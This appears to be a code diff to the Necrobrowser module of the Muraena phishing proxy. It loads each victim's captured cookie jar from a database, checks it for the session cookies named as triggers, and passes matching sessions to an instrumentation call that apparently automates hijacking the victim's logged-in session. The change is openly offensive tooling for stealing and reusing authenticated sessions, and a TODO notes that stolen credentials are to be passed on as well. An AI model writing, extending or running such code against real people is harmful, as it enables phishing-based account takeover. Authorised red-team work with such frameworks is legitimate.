@@ -6,6 +6,8 @@ import (
 	"strings"
 	"time"
 
+	"github.com/evilsocket/islazy/tui"
+
 	"github.com/muraenateam/muraena/log"
 
 	"gopkg.in/resty.v1"
@@ -41,6 +43,7 @@ type Necrobrowser struct {
 }
 
 // Cookies
+// Fixme: can't we use the VictimCookie struct? (db/victim)
 type SessionCookie struct {
 	Name     string `json:"name"`
 	Value    string `json:"value"`
@@ -147,7 +150,14 @@ func (module *Necrobrowser) CheckSessionCookies() {
 	for _, v := range victims {
 		cookiesFound := 0
 		cookiesNeeded := len(triggerValues)
-		for _, cookie := range v.Cookies {
+
+		victimCookies, err := v.GetCookieJar()
+		if err != nil {
+			module.Error("Unable to retrieve victim: %s cookies. %v", tui.Bold(v.ID), err)
+			continue
+		}
+
+		for _, cookie := range victimCookies {
 			if Contains(&triggerValues, cookie.Name) {
 				cookiesFound++
 			}
@@ -155,7 +165,7 @@ func (module *Necrobrowser) CheckSessionCookies() {
 
 		// if we find the cookies, and the session has not been already instrumented (== false), then instrument
 		if cookiesNeeded == cookiesFound && !v.SessionInstrumented {
-			module.Instrument(v.Cookies, "[]") // TODO add credentials JSON, instead of passing empty [] array
+			module.Instrument(victimCookies, "[]") // TODO add credentials JSON, instead of passing empty [] array
 			// prevent the session to be instrumented twice
 			_ = db.SetSessionAsInstrumented(v.ID)
 		}
